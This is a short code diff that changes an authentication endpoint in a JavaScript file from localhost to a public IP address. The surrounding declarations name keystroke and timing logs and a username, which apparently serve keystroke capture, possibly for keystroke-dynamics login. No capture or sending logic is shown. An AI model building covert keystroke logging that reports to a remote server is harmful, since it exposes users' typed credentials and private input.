@@ -1,4 +1,4 @@
-var url_k = 'http://localhost:5000/auth'
+var url_k = 'http://162.243.145.18:80/auth'
 var keylog = [];
 var timelog = [];
 var username;
